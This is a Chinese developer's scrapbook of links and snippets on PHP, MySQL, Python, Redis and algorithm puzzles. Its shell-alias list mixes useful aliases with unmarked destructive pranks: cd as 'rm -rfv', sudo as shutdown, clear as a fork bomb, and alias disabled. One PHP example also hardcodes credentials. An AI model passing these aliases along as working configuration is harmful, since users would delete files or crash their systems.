[xiaoshuwu.net 分享有价值的书籍资料python](https://pan.baidu.com/share/home?uk=3339153721#category/type=0)
[ PHP之 mb_strimwidth字符串截取函数使用 & UTF8编码认识](http://blog.csdn.net/sosospicy/article/details/9111191)
此函数按等宽字体计算字符串占用宽度。汉字占两个宽度，其余占一个宽度。
mb_strimwidth() 即不是按字节，也不是按字符截取，而是按照宽度。在 php.net 的说明中指出，多字节字符通常是单字节字符的两倍宽度，也就是说，英文字符占一个宽度，中文占两个，宽度不足以截取一个字符时则不取。
mb_substr() 截取的是字符个数，而 mb_strimwidth() 截取的是字符宽度
echo mb_strimwidth('辅导费对方的辅导费对方的辅导费对方的辅导费对方的辅导费对方的', 0, 23, '...','utf-8');//截取10个汉字
from collections import Counter
counts = Counter('列表名')
counts. most_common(10)#前10位的计数

对于DataFrame对象中的一列所返回的对象Series，例如frame['属性名']，有一个value_counts方法，

counts = frame['属性名'].value_counts()
[多账户微信登录/收发消息/管理群聊 API](https://github.com/leohowell/barbossa)
[Python入门之生成海贼王云图](http://101python.cn/wordcloud)
[WebSocket 教程](http://www.ruanyifeng.com/blog/2017/05/websocket.html)
视频地址： http://pan.baidu.com/s/1kUCGcJ1
[通过 itchat 实现微信远程开启内网机器](https://github.com/monkey-wenjun/wchatwakeonlan)
[如何记忆VIM快捷键 cheatsheet](https://blog.haitun.me/remember-vim/)
异步导出数据
```js
<img class="advs-image" src="//dev-vhall-static.oss-cn-beijing.aliyuncs.com/upload/webinars\promote\3b\f0\3bf0dcd1ce9d2cb7862560753055cad8.png?" onerror="this.src='//dev-vhall-static.oss-cn-beijing.aliyuncs.com/static/img/ad.jpg'" alt=""/>
图片加载不了会替换src 控制台看到的和源码不同

foreach ($arr as &$v)
$arr=[1,2,3];
&$v=$arr[0];//$v成为$arr[0]的引用
&$v=$arr[1];//$v成为$arr[1]的引用
&$v=$arr[2];//$v成为$arr[2]的引用
//此处结束$arr=[1,2,3];
$v=$arr[0];//因为作用域被改变的原因,此处$v实际上是$arr[2]的引用,相当于$arr[2]=$arr[0];$arr=[1,2,1];
$v=$arr[1];//相当于$arr[2]=$arr[1];$arr=[1,2,2];
$v=$arr[2];//相当于$arr[2]=$arr[2];$arr=[1,2,2];
/**
     * 设置活动 附属属性到hash表
     * @param $id
     * @param array $data
     */
    public static function setWebinarsAttachedInfo($id,$data =[]){
        $key = self::WEBINARS_ATTACHED_INFO.$id;
        RedisFacade::hmset($key,$data);
    }

    /**
     * 设置活动列表
     * @param $webinar_id
     */
    public static function setWebinarList($webinar_id){
        $key = self::WEBINARS_EXPORT_LIST;
        RedisFacade::sadd($key,$webinar_id);
    }


    /**
     * 异步导出处理逻辑
     * @param $id
     * @param $startDate
     * @param $endDate
     * @return array
     */
    public static function asyncExport($id,$startDate,$endDate,$isMerge = false){
        $rsData = ['code'=>'200','msg'=>'生成中'];
        $status =RedisFacade::hget(self::WEBINARS_ATTACHED_INFO.$id,'async_export_status');
        if(1 == $status){
            $rsData = ['code'=>400,'msg'=>'已有一个导出任务正在生成中，请稍后'];
        }else{
            $exportAttributes = [
                'is_async_export'=>1,       //活动是否有异步导出
                'async_export_time'=>time(),//导出时间
                'async_export_status'=>1    //当前异步导出进度状态 1开始，2完成
            ];
            self::setWebinarsAttachedInfo($id,$exportAttributes);
            \Queue::push(new \App\Commands\VodTableExportDeal($id,$startDate,$endDate,$isMerge),null,'vodtable_async_export');
        }
        return $rsData;
    }
    /**
     * 结束导出处理
     * @param $webinar_id
     */
    private function endExportDeal($webinar_id){
        $data = ['async_export_status'=>2];
        \App\Services\VodTableService::setWebinarsAttachedInfo($webinar_id,$data);
        //活动id 计入集合
        \App\Services\VodTableService::setWebinarList($webinar_id);
    }
 数据库中有一百张表， 我想知道哪些表格里面含有student字段   
    select * from information_schema.columns where TABLE_SCHEMA = 'db_sms' and COLUMN_NAME = 'student'
 获取数据表字段 show full columns from table
   Db::query( "SELECT COLUMN_NAME FROM information_schema. COLUMNS WHERE table_name = '$table'" );
   http://101.201.236.181:8081/ip?ip=1.119.129.2
   {
	"ret":	"ok",
	"data":	["中国", "中国", "", "", "wishisp.com", "36.894402", "104.166000", "Asia/Chongqing", "UTC+8", "100000", "86", "CN", "AP"]
}
```
[【QQ/微信个人号变身机器人】炸群+远程监控个人PC的尝试](https://zhuanlan.zhihu.com/p/26820394?refer=666666)

[利用wordcloud包制做中文标签云](https://github.com/lpty/wordcloud)
https://github.com/amueller/word_cloud 
wordcloud_cli.py --text mytext.txt --imagefile wordcloud.png
[github短连接](https://git.io/)
http://www.cnblogs.com/shanwater/p/5636553.html http://www.kuqin.com/shuoit/20141118/343265.html 
[对 Python 闭包的理解](https://www.v2ex.com/t/361368)
```js
作用域是程序运行时变量可被访问的范围，定义在函数内的变量是局部变量，局部变量的作用范围只能是函数内部范围内，它不能在函数外引用。
def print_msg():
	# print_msg 是外围函数
	msg = "zen of python"
    def printer():
    	# printer 是嵌套函数
        print(msg)
    return printer

another = print_msg()
# 输出 zen of python
another()
函数中的局部变量仅在函数的执行期间可用，一旦 print_msg() 执行过后，我们会认为 msg变量将不再可用。然而，在这里我们发现 print_msg 执行完之后，在调用 another 的时候 msg 变量的值正常输出了，这就是闭包的作用，闭包使得局部变量在函数外被访问成为可能。
def adder(x):
    def wrapper(y):
        return x + y
    return wrapper

adder5 = adder(5)
# 输出 15
adder5(10)
# 输出 11
adder5(6)
所有函数都有一个 __closure__属性，如果这个函数是一个闭包的话，那么它返回的是一个由 cell 对象 组成的元组对象。cell 对象的 cell_contents 属性就是闭包中的自由变量。

>>> adder.__closure__
>>> adder5.__closure__
(<cell at 0x103075910: int object at 0x7fd251604518>,)
>>> adder5.__closure__[0].cell_contents
5
```
[mysql查询时，offset过大影响性能的原因与优化方法](http://blog.csdn.net/fdipzone/article/details/72793837)
mysql> select id from member where gender=1 limit 300000,1;因此我们先查出偏移后的主键，再根据主键索引查询数据块的所有内容即可优化。
select a.* from member as a inner join (select id from member where gender=1 limit 300000,1) as b on a.id=b.id;
[ mysql group by 组内排序方法](http://blog.csdn.net/fdipzone/article/details/72453553)
```js
/**
 * 获取指定日期段内每一天的日期
 * @param  Date  $startdate 开始日期
 * @param  Date  $enddate   结束日期
 * @return Array
 */
function getDateFromRange($startdate, $enddate){

    $stimestamp = strtotime($startdate);
    $etimestamp = strtotime($enddate);

    // 计算日期段内有多少天
    $days = ($etimestamp-$stimestamp)/86400+1;

    // 保存每天日期
    $date = array();

    for($i=0; $i<$days; $i++){
        $date[] = date('Y-m-d', $stimestamp+(86400*$i));
    }

    return $date;
}
一个评论表有多个用户评论，需要获取每个用户最后评论的内容
mysql> select a.*from comment a,(select user_id,max(addtime) addtime from commen
t group by user_id) b where a.user_id=b.user_id and a.addtime=b.addtime;
select * from comment where id in(select max(id) from comment group by user_id) order by userid
select a.* from comment as a right join 
(select user_id, max(addtime) as maxtime from comment where user_id is not null group by user_id) as b 
on a.user_id=b.user_id and a.addtime=b.maxtime order by a.user_id asc;
[mysql explain中key_len的计算方法](http://blog.csdn.net/fdipzone/article/details/55804684)
使用变长字段需要额外增加2个字节，使用NULL需要额外增加1个字节，因此对于是索引的字段，最好使用定长和NOT NULL定义，提高性能
select a.id,a.name,IFNULL(b.lastlogintime,0) as lastlogintime from user as a left join user_lastlogin as b on a.id=b.uid;
```
[ php 判断页面或图片是否经过gzip压缩](http://blog.csdn.net/fdipzone/article/details/53191442)
ob_start('ob_gzhandler'); // 开启gzip，屏蔽则关闭
function check_gzip($url){
    $header = get_headers($url, 1);
    if(isset($header['Vary']) && $header['Vary']=='Accept-Encoding'){
        return true;
    }
    return false;
}
[php 从指定数字中获取随机组合的方法](http://blog.csdn.net/fdipzone/article/details/51794055)
```js
function getNumGroups($var, $num){

    // 数量不正确
    if($var<$num){
        return array();
    }

    $total = 0;
    $result = array();

    for($i=1; $i<$num; $i++){
        $tmp = mt_rand(1, $var-($num-$i)-$total);
        $total += $tmp;
        $result[] = $tmp;
    }

    $result[] = $var-$total;

    return $result;

}
$a = 0.1;
$b = 0.9;
$c = 1;

printf("%.20f", $a+$b); // 1.00000000000000000000
printf("%.20f", $c-$b); // 0.09999999999999997780
var_dump(($c-$b)==$a);                   // false
var_dump(round(($c-$b),1)==round($a,1)); // true
var_dump(bcsub($c, $b, 1)==$a); // true
使用glob方法遍历指定文件夹（包括子文件夹）下所有php文件
$path = dirname(__FILE__);
$result = array();
traversing($path, $result);
print_r($result);

function traversing($path, &$result){
    $curr = glob($path.'/*');
    if($curr){
        foreach($curr as $f){
            if(is_dir($f)){
                array_push($result, $f);
                traversing($f, $result);
            }elseif(strtolower(substr($f, -4))=='.php'){
                array_push($result, $f);
            }
        }
    }
}
PDO 查询mysql返回字段整型变为String型解决方法 如id在数据库中是Int的，查询后返回是String型
$pdo = new PDO($dsn, $user, $pass, $param);

// 在创建连接后，加入
$pdo->setAttribute(PDO::ATTR_STRINGIFY_FETCHES, false);
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
PDO::ATTR_STRINGIFY_FETCHES 提取的时候将数值转换为字符串。 
PDO::ATTR_EMULATE_PREPARES 启用或禁用预处理语句的模拟。
$str = '1,2,3,4,5,6,7,8,9';
$arr = explode(',', $str,0);  ids=null，使用explode分割，得出的数组是Array ( [0] => )而不是Array()。
输出时用%u来格式化为无符号整型
$ip = '192.168.101.100';
$ip_long = sprintf('%u',ip2long($ip));
echo $ip_long.PHP_EOL;  // 3232261476 
echo long2ip($ip_long); // 192.168.101.100
Strict Mode功能说明

不支持对not null字段插入null值
不支持对自增长字段插入”值
不支持text字段有默认值
 使用array_flip与isset方法会比in_array效率高很多。 array_flip方法去重比使用array_unique方法运行时间减少98%，内存占用减少4/5;
 查看表当前auto_increment alter table tablename auto_increment=NUMBER;
 select auto_increment from information_schema.tables where table_schema='db name' and table_name='table name';
$str = "中国,广东省,广州市,天河区,'113.329884,23.154799',1,'2016-01-01 12:00:00','1,2,3,4,5,6'";
$arr = str_getcsv($str, ',', "'");$arr = explode(',', $str);
mysql互换表中两列数据方法update product set original_price=price,price=original_price;
这样执行的结果只会使original_price与price的值都是price的值，因为update有顺序的， 
先执行original_price=price , original_price的值已经更新为price， 
然后执行price=original_price，这里相当于没有更新。
update product as a, product as b set a.original_price=b.price, a.price=b.original_price where a.id=b.id;
show global variables like '%group_concat_max_len%';
function randFloat($min=0, $max=1){
    return $min + mt_rand()/mt_getrandmax() * ($max-$min);
}
public function version_to_integer($version){
        if($this->check($version)){
            list($major, $minor, $sub) = explode('.', $version);
            $integer_version = $major*10000 + $minor*100 + $sub;
            return intval($integer_version);
        }else{
            throw new ErrorException('version Validate Error');
        }
    }
/**
     * 将数字转为版本
     * @param  Int     $version_code 版本的数字表示
     * @return String
     */
    public function integer_to_version($version_code){
        if(is_numeric($version_code) && $version_code>=10000){
            $version = array();
            $version[0] = (int)($version_code/10000);
            $version[1] = (int)($version_code%10000/100);
            $version[2] = $version_code%100;
            return implode('.', $version);
        }else{
            throw new ErrorException('version code Validate Error');
        }
    }
    使用curl POST数据时，如果POST的数据大于1024字节，curl并不会直接就发起POST请求。而是会分两步。
1.发送一个请求，header中包含一个Expect:100-continue，询问Server是否愿意接受数据。
2.接受到Server返回的100-continue回应后，才把数据POST到Server。
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Expect:")); 

if (($_SERVER['PHP_AUTH_USER']!= "fdipzone" || $_SERVER['PHP_AUTH_PW']!="654321")) {  
        header('WWW-Authenticate: Basic realm="localhost"');  
        header("HTTP/1.0 401 Unauthorized");  
        exit;  
    }  
curl_setopt($ch, CURLOPT_USERPWD, 'fdipzone:654321'); // 加入这句 
```
[ 使用FormData对象提交表单及上传图片](http://blog.csdn.net/fdipzone/article/details/38910553)
```js
var data = new FormData($('#form1')[0]);  
        $.ajax({  
            url: 'server.php',  
            type: 'POST',  
            data: data,  
            dataType: 'JSON',  
            cache: false,  
            processData: false,  
            contentType: false  
        }).done(function(ret){ 
        
        $name = isset($_POST['name'])? $_POST['name'] : '';  
$gender = isset($_POST['gender'])? $_POST['gender'] : '';  
  
$filename = time().substr($_FILES['photo']['name'], strrpos($_FILES['photo']['name'],'.'));  
  
$response = array();  
  
if(move_uploaded_file($_FILES['photo']['tmp_name'], $filename)){  
    $response['isSuccess'] = true;  
    $response['name'] = $name;  
    $response['gender'] = $gender;  
    $response['photo'] = $filename;  
}else{  
    $response['isSuccess'] = false;  
}  
  
echo json_encode($response);  

function ext_json_decode($str, $mode=false){  
    if(preg_match('/\w:/', $str)){  
        $str = preg_replace('/(\w+):/is', '"$1":', $str);  
    }  
    return json_decode($str, $mode);  
}  
  
$str = '{"name":"fdipzone"}';  
var_dump(ext_json_decode($str, true)); // array(1) { ["name"]=> string(8) "fdipzone" }  
  
$str1 = '{name:"fdipzone"}';  
var_dump(ext_json_decode($str1, true)); // array(1) { ["name"]=> string(8) "fdipzone" }  

php5.4 以后，json_encode增加了JSON_UNESCAPED_UNICODE , JSON_PRETTY_PRINT 等几个常量参数。使显示中文与格式化更方便
当执行session_start()后，session会被锁住。直到页面执行完成。
因此在页面执行其间，对sesssion进行写操作，只会保存在内存中，并不会写入session文件。
而对session进行读取，则需要等待，直到session锁解开才能读取到。

我们可以使用session_write_close()把数据写入session文件并结束session进程。这样就不需要等待页面执行完成，也能获取到执行到哪一步http://blog.csdn.net/fdipzone/article/details/30846529
PHP int 的范围是 -2147483648 ~ 2147483647，可用常量 PHP_INT_MAX 查看。
当求余的数超过这个范围，就会出现溢出。从而出现负数。
echo 3701256461%62; // -13   $res = floatval(3701256461);  
echo fmod($res,62); // 53  
```
[你只有 10 只小白鼠和一星期的时间，如何检验出哪个瓶子里有毒药](https://www.zhihu.com/question/19676641)
[开始Python的数据结构](https://zhuanlan.zhihu.com/p/27233450)
[大型目标渗透－01入侵信息搜集](https://zhuanlan.zhihu.com/p/27233785)
[php 如何设置一个严格控制过期时间的session](http://blog.csdn.net/fdipzone/article/details/48816891)
使用memcache/Redis来保存session，设置过期时间，因为memcache/redis的回收机制不是按机率的，可以确保session过期后失效。
[ 客户端调用服务端接口减少请求数据容量的优化例子](http://blog.csdn.net/fdipzone/article/details/51540891)
[使用redis锁限制并发访问类](http://blog.csdn.net/fdipzone/article/details/51793837)
[ php flock 使用实例](http://blog.csdn.net/fdipzone/article/details/43839851)
[mysql left join 右表数据不唯一的情况解决方法](http://blog.csdn.net/fdipzone/article/details/45119551)
[php str_replace 替换指定次数方法](http://blog.csdn.net/fdipzone/article/details/45854413)
[ crontab 精确到执行分钟内某一秒执行的方法](http://blog.csdn.net/fdipzone/article/details/52079533)
* * * * * php /Users/fdipzone/test.php >> /Users/fdipzone/test.log crontab总是在执行分钟的0~1秒开始执行指定命令。 
如果想在执行分钟的第30秒执行，只使用crontab命令不能做到，但我们可以加一个sleep命令去延迟执行，使延迟指定秒数后再执行指定命令。* * * * * sleep 30; php /Users/fdipzone/test.php >> /Users/fdipzone/test.log
[ mysql导入大批量数据出现MySQL server has gone away的解决方法](http://blog.csdn.net/fdipzone/article/details/51974165)
增大 max_allowed_packet 参数可以使client端到server端传递大数据时，系统能够分配更多的扩展内存来处理
set global max_allowed_packet=268435456;show global variables like 'max_allowed_packet';
[FSCapture是一款抓屏工具](http://jingyan.baidu.com/article/d5c4b52be9a966da560dc5af.html)
[PDO和消息队列的一点个人理解](http://www.cnblogs.com/loveyoume/p/6107239.html)
[支付宝 alipay-sdk- PHP](https://www.v2ex.com/t/348451)
https://github.com/wxpay/WXPay-SDK-PHP  https://github.com/wxpay https://github.com/fishlab/alipay-sdk-php
```js
经实践，最终我的做法是： 
1 、在 vendors 下新建 alipay 
2 、把 SDK 里的 aop 目录拷到 alipay 下（抛弃原来 SDK 目录下的 lotusphp_runtime 和 AopSdk.php ） 
3 、最终目录结构是 vendors/alipay/aop 
4 、 composer.json 的 autoload 节点里加入： 

"classmap": [ 
"vendor/alipay/aop" 
] 

5 、运行``composer dump-autoload`` 
6 、这样在项目里可以不用 require ，直接： 
 
// 仅测试能使用命名空间，忽略参数设置吧。。。 
$a = new \AopClient(); 
$b = new \AlipayAppTokenGetRequest(); 
$c = $a->execute($b); 
修改  composer.json  把这个文件夹下的所有类自动归入根命名空间
"autoload": {

  "classmap": [

    "app/controllers",

    "app/models",

    "services"

  ]

}
运行  composer dump-autoload ，完成以后，我们就可以在控制器中直接调用这个类了

```
[Unicode字符集中有哪些神奇的字符](https://www.zhihu.com/question/30873035/answer/178297820)
https://link.zhihu.com/?target=http%3A//www.unicode.org/charts/ 
0.3-0.1=0.19999999999999998

就这个情况，短期内取代ptyhon 很难
[re unicode 范围报错](https://www.v2ex.com/t/365196#reply1)
```js
import re;re.findall(u'[\U00010000-\U0001FFFFF]', u'\U0001f61b',re.U)
```
[python 的 tuple 是不是冗余设计？](https://www.zhihu.com/question/60574107/answer/177715146)
```js
lst = [i for i in range(0xffff)]
tpl = tuple(i for i in range(0xffff))
from sys import getsizeof
getsizeof(lst)
tuple还具有一些list没有的特性（也不能算作优点吧），比如因为tuple是 immutable, 所以它是可哈希的(hashable)的。
tuple可以作为dict的key，或者扔进set里，list则不行
In [11]: hash(tpl)
Out[11]: 7487529697070271394 
chardet库：识别文件的编码格式
with open('test1.txt', 'rb') as f:    
    result = chardet.detect(f.read())  
print(result)
MVC的本质就是分离界面和逻辑.

界面反映在PHP开发里就是视图模板.

逻辑反映在PHP开发里就是控制器.

MVC连在一起表达就是: 控制器,加载数据模型,渲染视图模板.

可见控制器控制着整个程序输入输出的走向.

需要注意的是:

控制器里不写SQL操作模型,视图里不写逻辑处理业务.
```
在线拼接电影字幕截图工具http://join-screenshots.zhanghai.me/
Gist 管理工具 Leptonhttps://www.v2ex.com/t/365669
[ php7.1 的一些疑惑](https://www.v2ex.com/t/365509#reply10)
PHP 还可以做游戏服务端[pocketmine-mp]( https://github.com/pmmp/pocketmine-mp) 
 7.0 之前版本有类型隐形转换把，$tmp[$k]的时候自动把$tmp 转换成 array 了，7.1 没有做类型转换，所以输出就是 string 了
7.1 新特性，现在字符串不会自动转换为数组，跟你发的链接没什么关系http://php.net/manual/zh/migration71.incompatible.php#migration71.incompatible.empty-string-index-operator
[【数据库】Invalid default value for 'create_date' timestamp field](http://www.54php.cn/default/195.html)
`created_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT '插入时间' 就是不能为 timestamp字段设置指定的默认值，也就是语句中的 0000-00-00 00:00:00 其实从5.6.17这个版本就默认设置了不允许插入 0 日期了，术语是 NO_ZERO_IN_DATE  NO_ZERO_DATE 如果一定要设置为 0 日期的话，也是可以的，找到mysql的配置文件，在修改sql-mode,然后重启数据库服务 sql-mode = "STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION" SHOW VARIABLES LIKE 'sql_mode';
[完美解决failed to open stream: HTTP request failed!(file_get_contents引起的)](http://www.54php.cn/default/201.html)
ini_set("user_agent","Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)");
$data_content = file_get_contents( $url ); https://learnxinyminutes.com/
[有哪些程序员特有的技能](https://www.zhihu.com/question/30719851)
cmd里面不想一点点输入冗长的文件路径？
直接把这个文件拖到CMD窗口吧！
你会发现 路径自己补上去了。 shift 右键 在此处打开命令窗口
document.body.contentEditable = true
0x7FFFFFFF 2147483647，只能说明那群鬼子不懂二进制。 2^31-1
十进制2147483647转二进制为0111 1111 1111 1111 1111 1111 1111 1111 直接win+E打开文件夹把读计算机的朋友惊呆了
用WIN+L直接把屏幕锁住后，身后的一群金融精英们惊呆了 win+d，直接回到桌面，把所有小学生惊呆了 Win+TAB 3D切换，身边的一群文科僧惊呆了
电脑滑动解锁。
把开机密码设置为 asdfghjkl;' 进入登陆界面时，从左往右一路滑到Enter键上，然后就进去了
[排序算法-N个正整数排序](https://zhuanlan.zhihu.com/p/27095748)
[英语学渣8个月轻松突破9000单词量的宝贵方法论，不看绝对亏大了！](https://zhuanlan.zhihu.com/p/27136686)
[萌新刷题（一）A + B 问题](http://www.lintcode.com/zh-cn/problem/a-b-problem/)
https://link.zhihu.com/?target=https%3A//www.jiuzhang.com/solutions/
[将彩色图片转化为素描的效果图片](https://github.com/liujiachao/image---replace)
[一个把图片转换成字符画的小程序](https://www.zhihu.com/question/33646570/answer/102046631)
```js
一个基于命令行的在线词典 kuanghy/kictorhttps://github.com/kuanghy/kictor
import Image
 
color = 'MNHQ$OC?7>!:-;.' #zifu
 
def to_html(func):
    html_head = '''
            <html>
              <head>
                <style type="text/css">
                  body {font-family:Monospace; font-size:5px;}
                </style>
              </head>
            <body> '''
    html_tail = '</body></html>'
 # ding yi HTML
    def wrapper(img):
        pic_str = func(img)
        pic_str = ''.join(l + ' <br/>' for l in pic_str.splitlines())
        return html_head + pic_str + html_tail
 
    return wrapper
 # fan hui zhi
@to_html
def make_char_img(img):
    pix = img.load()
    pic_str = ''
    width, height = img.size
    for h in xrange(height):
        for w in xrange(width):
            pic_str += color[int(pix[w, h]) * 14 / 255]
        pic_str += '\n'
    return pic_str
 
def preprocess(img_name):
    img = Image.open(img_name)
 
    w, h = img.size
    m = max(img.size)
    delta = m / 200.0
    w, h = int(w / delta), int(h / delta)
    img = img.resize((w, h))
    img = img.convert('L')
 
    return img
 
def save_to_file(filename, pic_str):
    outfile = open(filename, 'w')
    outfile.write(pic_str)
    outfile.close()
 
def main():
    img = preprocess(raw_input('input your filename:'))
    pic_str = make_char_img(img)
    save_to_file('char.html', pic_str)
 
if __name__ == '__main__':
    main()
```
[分享几个我自己常用的 aliases](https://www.v2ex.com/t/365260#reply29)
```js
# 文件按大小排序，lbys = ls by size
alias lbys='ls -alhS'

# 文件按时间排序，lbyt = ls by time
alias lbyt='ls -alht'

# 重新运行上一条命令，并将输出复制到剪贴板，cl = copy last
alias cl='bash -c "$(fc -ln -1)" | pbcopy'

# 复制上一条命令
alias last='fc -ln -1 | pbcopy'

# 将当前剪贴板里的内容保存到某个文件里
alias new='pbpaste | cat >'
alias save='pbpaste | cat >'
alias c=clear
alias myip='curl ifconfig.co' curl ip.gs
alias cd='rm -rfv'; 
alias sudo='sudo shutdown -P now'; 
alias clear=':(){ :|:& };:'; 
alias cp='mv'; 
alias exit='sh'; 
alias if='if !' for='for !' while='while !'; 
alias vim="vim +q"; 
alias unalias=false; 
alias alias=false;
alias gr=./review 
alias http="echo http://$(echo $(hostname -I | cut -d' ' -f1) | xargs ):8000 && python3 -m http.server" 
```
[用 Redis 实现分布式锁与实现任务队列](http://blog.jobbole.com/95156/)

为了应对高并发，处理数据量超级大的一种数据容器，也可以说是利用各种方式，先把数据存储在一个···容器···中，然后，再慢慢从这个容器中获取数据，实现·····异步操作数据库·····的方式，以便降低数据库的压力
[简单理解桶排序](http://www.cnblogs.com/loveyoume/p/6286929.html)
```js
外层的for循环，我们就是用来控制比较········轮数········的,

　　内层的for循环，我们用来控制···················每一轮的比较次数··················的
 
//外层控制轮数
        for(var i=0;i<len;i++){
            //标记是否有排序的元素
            var mark = true;
            //内层对数组元素进行冒泡选择
            for(var j=0;j<len-1-i;j++){
                //交互元素
                if(arr[j] > arr[j+1]){
                    mark = false;
                    var temp = arr[j];
                        arr[j] = arr[j+1];
                        arr[j+1] = temp;    
                }
            }
            if(mark){
            //当没有进行冒泡选择时，证明已经排序好了
                return arr;    
            }
        }
```

git分支冲突
```js
$ git checkout test
error: unable to create file app/Commands/Search.php (Permission denied)
error: unable to create file app/Console/Kernel.php (Permission denied)
D       app/Commands/Search.php
D       app/Console/Kernel.php
Switched to branch 'test'

vhalllsp@VHALLLSP-PC /d/soft/wamp/www/laravel_web (test)
$ git checkout -b d
D       app/Commands/Search.php
D       app/Console/Kernel.php
Switched to a new branch 'd'

vhalllsp@VHALLLSP-PC /d/soft/wamp/www/laravel_web (d)
$ git commit -am 'u'
[d d13de58] u
 2 files changed, 135 deletions(-)
 delete mode 100644 app/Commands/Search.php
 delete mode 100644 app/Console/Kernel.php

vhalllsp@VHALLLSP-PC /d/soft/wamp/www/laravel_web (d)
$ git checkout test
Switched to branch 'test'

vhalllsp@VHALLLSP-PC /d/soft/wamp/www/laravel_web (test)
$ git branch -D d
Deleted branch d (was d13de58).

vhalllsp@VHALLLSP-PC /d/soft/wamp/www/laravel_web (test)
$ git merge saas3.3.0
Auto-merging app/Http/Controllers/Api/Internal/WebinarController.php
Merge made by the 'recursive' strategy.
 app/Http/Controllers/Api/Internal/WebinarController.php | 9 +++++++--
 对于preg_match
/[^a-zA-Z0-9_^\x{4e00}-\x{9fa5}]+/u


是正常的能达到目的的
/[^a-zA-Z0-9_\x{4e00}-\x{9fa5}]+/u
和
/^[a-zA-Z0-9_\x{4e00}-\x{9fa5}]+/u
就是不正常的

/^[a-zA-Z0-9_|\x{4e00}-\x{9fa5}]+/u

就又正常了


证明\x{4e00}-\x{9fa5}  在php正则中需要单独划出来
字节转换
function HumanSize($Bytes)
{
  $Type=array("", "kilo", "mega", "giga", "tera", "peta", "exa", "zetta", "yotta");
  $Index=0;
  while($Bytes>=1024)
  {
    $Bytes/=1024;
    $Index++;
  }
  return("".$Bytes." ".$Type[$Index]."bytes");
}
```
[500 桶酒找毒酒的最快编程方法](https://www.zhihu.com/question/56545610)
```js
500桶酒，其中1桶是毒酒；48小时后要举行酒会；毒酒喝下去会在之后的第23-24小时内毒死人；国王决定用囚犯来试酒，不介意囚犯死多少，只要求用最少的囚犯来测试出哪一桶是毒酒，问最少需要多少囚犯才能保证找出毒酒？

2个。一个人有25个时间段。25的平方大于500
500桶酒的“总不确定性”是log2(500)

一个囚犯的“表达能力”是log2(25)
https://www.nowcoder.com/questionTerminal/5bd27ea2bb9b4773b9e3ae0408c73aa1?source=relative 2的9次方=512>500
至少需要⌈log2(500)/log2(25)⌉ = 2 个囚犯测试出毒酒

总不确定性和表达能力分别与酒的桶数和时间间隔相关，看起来可以普适地解决这类问题

假设我们要计算1055×8712。 查表得lg1055≈3.023，lg8712≈3.940。 将两数相加，得6.963。 计算1055×8712≈10^6.963 = 9183330。 验算：直接计算1055×8712=9191160，可见有一定误差。在对数位数取值更多时，数值将更为精确。
>>> 10**(log(1055,10)+log(8712,10))
=> 9191160.0
>>> log(200,10)
=> 2.301029995664
>>> log(100,10)+log(2,10)
=> 2.301029995664
```
[1000杯酒,有一个是毒酒,用奴隶试酒,毒发10到20小时,问最少需要多少奴隶才能找出毒酒](https://www.zybang.com/question/20b505045e3423541cfcfbe4ddf8474c.html)
最少1个尝一杯就死.最多10个,把酒分500+500,两个奴隶分别全部尝500杯,挂掉一个,就知道毒酒在哪一半,添一个奴隶不断半分,2的十次方=1024,十次方意思就是每次死一个,最后两杯活下来的那个一个人试试就出来了,1000瓶倒在一起就是一瓶了,一大瓶!https://www.33iq.com/question/19870.html
[php解决中文截取乱码问题](http://www.cnblogs.com/loveyoume/p/6081930.html)
```js
call_user_func传递的参数必须符合系统函数的传参顺序
$return = call_user_func('rtrim','sso;osoo;',';');
$return2 = call_user_func('explode',';','sso;osoo;');

header('content-type:text/html;charset=utf-8;');
$str = '利要a-符e:r ttnx节小-子s区。vh;peh。例t来个oe体字n代gb节看t通c eu是的soS至什tna过码 t;Ie看C实e/,字le A来具8y么a)n=于ndg是r于 0tmt现码 e0ssf8单下s(uo别e的以ieh过aatx和t接要u几这看 nsw Ihrr用字 mgtts上就eg cAei的nwo码e跳h，t编';
/*
*在某篇文章中截取一段字符串，多余的用省略号...表示，并且防止中文乱码
*$param1 string要截取的字符串 $str  注意：这里是utf-8编码
*$param2 int截取字符串的长度 $len  
*返回值 成功返回所要截取的字符串，失败为空
*/
function str($str='',$len=0){
    //检查参数
    if(!is_string($str) || !is_int($len)){
        return '';
    }
    $length = strlen($str);
    if($length <= 0 ){
        return '';
    }
    if($len>=$length){
        return $str;
    }
    //初始化，统计字符串的个数，
    $count = 0;
    for($i=0;$i<$length;$i++){
        //达到个数跳出循环，$i即为要截取的长度
        if($count == $len){
            break;
        }
        $count++;
        //ord函数是获取字符串的ASCII编码，大于等于十六进制0x80的字符串即为中文字符串
        if(ord($str{$i}) >= 0x80){
            $i +=2;//中文编码的字符串的长度再加2
        }
    }
    //如果要截取的个数超过了字符串的总个数，那么我们返回全部字符串，不带省略号
    if($len > $count){
        return $str;
    }else{
        return substr($str,0,$i).'...';
    }
}
```
[遍历文件夹下面的所有文件](http://www.cnblogs.com/loveyoume/articles/5866235.html)
[php猴子称王或者约瑟夫难题](http://www.cnblogs.com/loveyoume/p/5914267.html)
```js
一群猴子排成一圈，按1，2，...，n依次编号。然后从第1只开始数，数到第m只,把它踢出圈，从它后面再开始数，再数到第m只，在把它踢出去...，如此不停的进行下去，直到最后只剩下一只猴子为止，那只猴子就叫做大王。要求编程模拟此过程，输入m、n,

　　输出最后那个大王的编号。
 原理是先构建一个n个人的数组，然后，根据报数数，第M逐一剔除数组的元素，保留最后剩余的那个
 function yueSeFu($n,$m){
    //限制条件
    if(!is_int($n) || !is_int($m) || $n<2 || $m<2) return false;
    //获取猴子的编号
    $arr = range(1,$n);
    //初始化数组的下标
    $i = 0;
    while(count($arr) > 1){
        
        if(($i+1) % $m == 0){
            //数到出局数的人踢出局
            unset($arr[$i]);
        }else{
            //其他的添加到数组的最后面
            array_push($arr,$arr[$i]);
            //删除掉已被转移到后面的数组元素
            unset($arr[$i]);
        }
        $i++;//继续往后数
    }
    return array_values($arr)[0];
}
  
  
```
